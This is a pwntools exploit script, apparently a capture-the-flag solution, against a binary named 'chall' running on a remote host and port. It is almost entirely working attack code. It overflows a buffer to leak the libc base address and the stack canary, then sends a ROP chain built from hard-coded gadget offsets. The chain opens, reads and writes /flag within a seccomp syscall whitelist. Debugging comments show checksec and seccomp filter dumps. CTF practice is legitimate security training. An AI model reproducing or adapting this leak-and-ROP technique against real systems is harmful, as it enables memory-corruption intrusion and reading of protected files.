#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.31.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '137.184.250.54', 7051

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x1319
# breakrva 0x1441
# breakrva 0x147d
breakrva 0x14a3
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      PIE enabled
#     Stack:    Executable
#     RWX:      Has RWX segments

# └──╼ [★]$ sudo seccomp-tools dump ./chall 
# Choose your target: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
# Target confirmed: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
# 9n
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
#  0005: 0x15 0x03 0x00 0x61616175  if (A == 0x61616175) goto 0009  ---> └──╼ [★]$ pwn cyclic -l 0x61616175
#                                                                         80
#  0006: 0x15 0x02 0x00 0x61616176  if (A == 0x61616176) goto 0009
#  0007: 0x15 0x01 0x00 0x61616177  if (A == 0x61616177) goto 0009
#  0008: 0x15 0x00 0x01 0x61616178  if (A != 0x61616178) goto 0010
#  0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0010: 0x06 0x00 0x00 0x00000000  return KILL

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    payload = b'HEADSHOT'.ljust((80+16+8+32)-1, b'C') + b'D'
    io.sendafter(b'target:', payload)
    io.recvuntil(b'CD')
    libc.address = u64(io.recv(6) + b'\x00\x00') - libc.sym['__libc_start_main'] - 243

    payload = b'HEADSHOT'.ljust((80+16+8), b'A') + b'B'
    io.sendafter(b'target:', payload)
    io.recvuntil(b'AB')
    canary = u64(b'\x00' + io.recv(7))
    stack = u64(io.recv(6) + b'\x00\x00')

    POP_RDI = libc.address + 0x023b6a
    POP_RSI = libc.address + 0x2601f
    POP_RDX_R12 = libc.address + 0x119431
    RET = libc.address + 0x22679
    MOV = libc.address + 0x34550 #  mov qword ptr [rdx], rax ; ret

    payload = b'A' * 80
    payload += p32(0x3b) + p32(1) + p32(0) + p32(257) # allowed syscall/seccomp whitelist, somehow execve doesn't work
    payload += b'\x00/flag'.ljust(8, b'\x00')
    payload += flat([
        canary,
        stack, # rbp

        POP_RDI,
        stack - 0x14f, # /flag
        POP_RSI,
        0x0,
        POP_RDX_R12,
        0x0,
        0x0,
        libc.sym['open'],

        # remote fd debug
        # POP_RDX_R12,
        # stack,
        # 0x0,
        # MOV,
        # POP_RDI,
        # 0x1,
        # POP_RSI,
        # stack,
        # POP_RDX_R12,
        # 0x8,
        # 0x0,
        # libc.sym['write'],

        POP_RDI,
        5, # fd, found out by debug above, it wasn't 3
        POP_RSI,
        stack,
        POP_RDX_R12,
        0x40,
        0x0,
        libc.sym['read'],

        POP_RDI,
        0x1, # stdout
        libc.sym['write'],
    ])
    io.sendafter(b'target:', payload)

    log.success('libc base: %#x', libc.address)
    log.success('canary: %#x', canary)
    log.success('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
